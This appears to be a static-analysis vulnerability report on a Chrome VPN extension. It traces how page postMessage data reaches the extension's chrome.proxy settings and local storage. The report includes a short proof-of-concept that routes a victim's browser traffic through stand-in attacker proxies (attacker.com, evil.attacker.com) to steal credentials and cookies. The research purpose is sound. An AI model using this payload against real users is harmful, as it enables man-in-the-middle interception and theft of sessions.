# CoCo Analysis: lochiccbgeohimldjooaakjllnafhaid

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 6 (all same flow pattern leading to proxy manipulation and storage poisoning)

---

## Sink: cs_window_eventListener_message → chrome_storage_local_set_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/lochiccbgeohimldjooaakjllnafhaid/opgen_generated_files/cs_0.js
Line 1298	window.addEventListener("message", function(event) {
Line 1306	if (event.data.type && (event.data.type == "FROM_PAGE")) {
Line 1309	chrome.runtime.sendMessage({action: "connect",server:event.data.text}, function(response) {

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/lochiccbgeohimldjooaakjllnafhaid/opgen_generated_files/bg.js
Line 1088	var vars = request.server.split(",");
Line 1091	doConnection(vars[2],vars[0],parseInt(vars[1]),false);
```

**Code:**

```javascript
// Content script (cs_0.js) - after 3rd "// original" marker at line 465
window.addEventListener("message", function(event) {
    // We only accept messages from ourselves
    if (event.source != window) {
        return;
    }

    if (event.data.type && (event.data.type == "FROM_PAGE")) {
        var data = { type: "FROM_EXTENSION", text: "connecting" };
        window.postMessage(data, "*");
        chrome.runtime.sendMessage({
            action: "connect",
            server: event.data.text  // ← attacker-controlled from postMessage
        }, function(response) {
            // console.log(response);
        });
    }

    if (event.data.type && (event.data.type == "FROM_PAGE_GLOBAL")) {
        var data = { type: "FROM_EXTENSION_GLOBAL", text: "connecting" };
        window.postMessage(data, "*");
        chrome.runtime.sendMessage({
            action: "connectGlobal",
            server: event.data.text  // ← attacker-controlled from postMessage
        }, function(response) {
            // console.log(response);
        });
    }
});

// Background script (bg.js) - after 3rd "// original" marker at line 963
chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
    if (request.action == "connect") {
        sendResponse('received');
        if (request.server == "Direct Connection") {
            disconnect();
        } else {
            connect(request.server);  // ← attacker-controlled server parameter
        }
    }

    if (request.action == "connectGlobal") {
        var vars = request.server.split(",");  // ← attacker-controlled, format: "host,port,type"
        doConnection(vars[2], vars[0], parseInt(vars[1]), false);  // ← attacker controls proxy settings
    }
});

function doConnection(type, host, port, server) {
    if (server == false) {
        var server = host;
    }

    // Storage poisoning with attacker-controlled data
    chrome.storage.local.set({"connection": [type, host, port, server]});  // ← storage sink
    chrome.storage.local.set({"connected": server});  // ← storage sink

    // CRITICAL: Setting proxy with attacker-controlled values!
    var config = {
        mode: "fixed_servers",
        rules: {
            singleProxy: {
                scheme: type,    // ← attacker-controlled (e.g., "http", "https", "socks5")
                host: host,      // ← attacker-controlled proxy host
                port: parseInt(port)  // ← attacker-controlled proxy port
            },
            bypassList: ["<local>", "www.freevpn.one", "freevpn.one", "drive.google.com",
                         "*ip-api.com", "*ipunblock.com", "*browservpn.net", "*lluia.com",
                         "*logonless.com", "webcache.googleusercontent.com"]
        }
    };

    chrome.proxy.settings.set({value: config, scope: 'regular'}, function() {
        if(notify == true) {
            chrome.notifications.create('', {
                type: 'basic',
                iconUrl: '/images/icon-128.png',
                title: 'Connected',
                message: 'You have connected to Free VPN',
                priority: 2
            });
        }

        chrome.action.setIcon({ path: "/images/icon-16-on.png" })

        chrome.tabs.query({active: true, currentWindow: true}, function(tabs){
            console.log(tabs);
            chrome.tabs.sendMessage(tabs[0].id, {
                type: "FROM_EXTENSION",
                action: "connected",
                server: server
            });
        });
    });
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage from malicious webpage

**Attack:**

```javascript
// Attacker's malicious webpage code
// Route all victim traffic through attacker's proxy to intercept credentials, cookies, etc.
window.postMessage({
    type: "FROM_PAGE_GLOBAL",
    text: "http,attacker.com,8080"  // Format: "scheme,host,port"
}, "*");

// Or use SOCKS5 proxy
window.postMessage({
    type: "FROM_PAGE_GLOBAL",
    text: "socks5,evil.attacker.com,1080"
}, "*");

// The extension will set chrome.proxy.settings to route all traffic through attacker's proxy
```

**Impact:**

Critical vulnerability. An attacker controlling a webpage can:

1. **Man-in-the-Middle All Traffic**: By setting an attacker-controlled proxy server, all HTTP/HTTPS traffic from the victim's browser (except bypass list) will be routed through the attacker's proxy. This allows the attacker to:
   - Intercept and read all unencrypted HTTP traffic
   - Perform SSL stripping attacks on HTTPS connections
   - Steal credentials, session cookies, and sensitive data
   - Inject malicious content into web pages
   - Monitor all victim's browsing activity

2. **Storage Poisoning**: The attacker can also poison chrome.storage.local with arbitrary connection data, though this is secondary to the proxy manipulation.

The check `if (event.source != window)` is insufficient protection - any malicious webpage can still send postMessage to its own window object, which the content script will accept. The manifest shows content_scripts runs on all HTTP/HTTPS URLs (`"matches": [ "http://*/*", "https://*/*" ]`), making this exploitable from any malicious website the victim visits.
